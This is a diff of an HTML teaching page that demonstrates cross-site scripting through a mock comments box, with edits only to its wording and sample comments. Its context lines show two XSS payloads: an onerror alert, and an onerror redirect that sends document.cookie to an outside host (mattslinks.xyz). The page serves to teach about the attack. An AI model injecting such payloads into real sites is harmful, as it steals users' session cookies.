@@ -10,7 +10,7 @@
         This page shows you how someone can steal your information if they are able to inject javascript onto the page.
     </p>
     <p>
-        This example uses a 'comments' sectioon as the vector for the evil scripts. Imagine that a malicious user has added a comment to the page - copy paste the attacker code into the comment box to see the effects.
+        This example uses a 'comments' sectioon as the vector for evil scripts. Imagine that a malicious user has added a comment to the page - copy paste the attacker's code into the comment box to see the effects.
     </p>
     <p>
         More info <a href="https://excess-xss.com/">here</a>.
@@ -23,7 +23,7 @@
     <textarea readonly="True"><img src='x' onerror="alert('You got haaaacked')"></textarea>
     <h4>User comments</h4>
     <div id="comment-box-0" class="comment-box">
-        <div class="comment">Anon says: I liked it!</div>
+        <div class="comment">Anon says: I liked it! It was very pretty.</div>
     </div>
     <textarea id="comment-text-0" placeholder="Write comment here"></textarea>
     <button id="comment-btn-0" onClick="">Submit</button>
@@ -35,7 +35,7 @@
     <textarea readonly="True"><img src='x' onerror="window.location = 'https://mattslinks.xyz?stolenCookies='+encodeURI(document.cookie)"></textarea>
     <h4>User comments</h4>
     <div id="comment-box-1" class="comment-box">
-        <div class="comment">Anon says: I liked it!</div>
+        <div class="comment">Anon says: Horrible product, would not buy again.</div>
     </div>
     <textarea id="comment-text-1" placeholder="Write comment here"></textarea>
     <button id="comment-btn-1" onClick="">Submit</button>
